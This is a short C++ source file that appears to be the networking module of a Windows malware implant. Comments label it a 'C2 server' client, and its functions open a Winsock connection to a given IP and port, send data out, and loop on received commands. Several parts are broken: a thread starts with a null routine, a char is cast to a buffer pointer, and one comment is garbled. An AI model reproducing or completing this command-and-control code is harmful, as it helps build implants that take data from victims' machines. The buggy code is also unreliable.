#include "Un-main.h"
#include <malloc.h>
#include<winsock.h>
#pragma comment(lib,"ws2_32.lib")

SOCKET g_ClientSocket;

//? Connect to C2 server
BOOL Connect_to_C2_server(char *lpszServerIp,int iServerPort) {
	
	//!  ³õÊ¼»¯WinSock¿â
	LPTHREAD_START_ROUTINE  RecvThreadprov = {0};
	WSAData wsadata = { 0 };
	::WSAStartup(MAKEWORD(2, 2), &wsadata);
	g_ClientSocket=::socket(AF_INET, SOCK_STREAM, 0);
	if (INVALID_SOCKET==g_ClientSocket)
	{
		return false;
	}
	sockaddr_in addr = { 0 };
	addr.sin_family=AF_INET;
	addr.sin_port = ::htons(iServerPort);
	addr.sin_addr.S_un.S_addr = ::inet_addr(lpszServerIp);
	if (0!=::connect(g_ClientSocket,(sockaddr*)(&addr),sizeof(addr)))
	{
		return false;
	}
	::CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)RecvThreadprov, NULL, NULL, NULL);
	return true;
}

//? send data to C2 server
void send_data(char* pszSend) {
	::send(g_ClientSocket, pszSend, (1 + ::lstrlen(pszSend)),0);
}


//?  Accept Data
void RecvMsg(char to_server_data) {
	char szBuf[MAX_PATH] = { 0 };
	while (TRUE)
	{
		int iRet = ::recv(g_ClientSocket, (char*)to_server_data, MAX_PATH, 0);
		if (0>=iRet)
		{
			continue;
		}
	}
}

